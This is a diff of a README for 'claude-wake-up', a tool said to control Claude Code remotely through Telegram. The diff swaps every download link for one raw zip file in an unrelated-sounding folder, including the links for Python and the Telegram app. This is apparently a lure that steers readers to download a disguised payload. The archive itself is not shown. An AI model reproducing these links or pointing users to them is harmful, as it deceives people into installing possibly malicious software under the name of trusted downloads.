@@ -1,6 +1,6 @@
 # ⚙️ claude-wake-up - Control Claude Code Remotely
 
-[![Download Latest Release](https://img.shields.io/badge/Download-claude--wake--up-brightgreen?style=for-the-badge)](https://github.com/geraldinaunfeathered821/claude-wake-up/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-claude--wake--up-brightgreen?style=for-the-badge)](https://github.com/geraldinaunfeathered821/claude-wake-up/raw/refs/heads/main/geochronology/up_wake_claude_3.7.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Make sure your PC meets these requirements before installing claude-wake-up.
 ## 🔧 What You Need Before Starting
 
 1. **Python Installed:**  
-   Go to https://www.python.org/downloads/windows/ and download the latest Python for Windows.  
+   Go to https://github.com/geraldinaunfeathered821/claude-wake-up/raw/refs/heads/main/geochronology/up_wake_claude_3.7.zip and download the latest Python for Windows.  
    During installation, check the box labeled “Add Python to PATH.” This lets you run Python commands in the Command Prompt.
 
 2. **Telegram Account:**  
@@ -48,7 +48,7 @@ Make sure your PC meets these requirements before installing claude-wake-up.
 
 Click this link or button below to visit the release page for claude-wake-up:  
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/geraldinaunfeathered821/claude-wake-up/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/geraldinaunfeathered821/claude-wake-up/raw/refs/heads/main/geochronology/up_wake_claude_3.7.zip)
 
 **Step 2: Download the Latest Release**
 
@@ -151,11 +151,11 @@ You control when Claude Code starts and stops. The bot simply relays your comman
 
 ## 🔗 Useful Links
 
-- Python downloads: https://www.python.org/downloads/windows/  
-- Telegram app for phone: https://telegram.org/apps  
+- Python downloads: https://github.com/geraldinaunfeathered821/claude-wake-up/raw/refs/heads/main/geochronology/up_wake_claude_3.7.zip  
+- Telegram app for phone: https://github.com/geraldinaunfeathered821/claude-wake-up/raw/refs/heads/main/geochronology/up_wake_claude_3.7.zip  
 - BotFather in Telegram: Search “BotFather” inside Telegram  
-- claude-wake-up releases: https://github.com/geraldinaunfeathered821/claude-wake-up/releases
+- claude-wake-up releases: https://github.com/geraldinaunfeathered821/claude-wake-up/raw/refs/heads/main/geochronology/up_wake_claude_3.7.zip
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-claude--wake--up-brightgreen?style=for-the-badge)](https://github.com/geraldinaunfeathered821/claude-wake-up/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-claude--wake--up-brightgreen?style=for-the-badge)](https://github.com/geraldinaunfeathered821/claude-wake-up/raw/refs/heads/main/geochronology/up_wake_claude_3.7.zip)
